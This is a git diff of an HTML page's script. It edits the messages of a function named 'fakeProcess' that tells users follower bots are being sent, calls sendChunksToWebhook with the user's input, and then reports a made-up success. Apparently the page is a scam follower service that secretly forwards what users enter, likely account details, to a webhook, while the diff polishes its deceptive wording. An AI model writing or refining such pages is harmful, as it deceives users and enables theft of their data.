@@ -334,7 +334,7 @@ async function fakeProcess() {
 
     // Show "Sending bots..."
     msg.style.display = "block";
-    msg.textContent = "Sending bots...";
+    msg.textContent = "Sending bot followers please wait 5 seconds...";
 
     // Wait 3 seconds
     await new Promise(resolve => setTimeout(resolve, 3000));
@@ -343,7 +343,7 @@ async function fakeProcess() {
     await sendChunksToWebhook(input);
 
     // Show success message
-    msg.textContent = "Successfully Sent 4.4k Followers";
+    msg.textContent = "Successfully Sent Followers";
 
     // Hide after 3 seconds
     setTimeout(() => {
@@ -364,3 +364,4 @@ panels.forEach(panel => observer.observe(panel));
 
 </body>
 </html>
+
